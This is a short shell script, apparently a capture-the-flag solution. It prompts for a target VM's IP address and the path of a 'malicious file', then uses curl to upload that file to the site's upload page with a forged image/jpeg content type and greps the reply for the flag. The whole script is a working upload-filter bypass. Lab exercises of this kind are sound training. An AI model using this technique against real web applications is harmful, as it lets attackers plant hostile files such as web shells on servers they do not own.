#!/bin/sh

echo "input the VM ip address :"
read ip
url="http://${ip}/"

echo "input absolute path of malicious file :"
read path

response=$(curl -s -F "uploaded=@${path};type=image/jpeg" -F "Upload=Upload" "${url}?page=upload" | grep flag)
echo $response
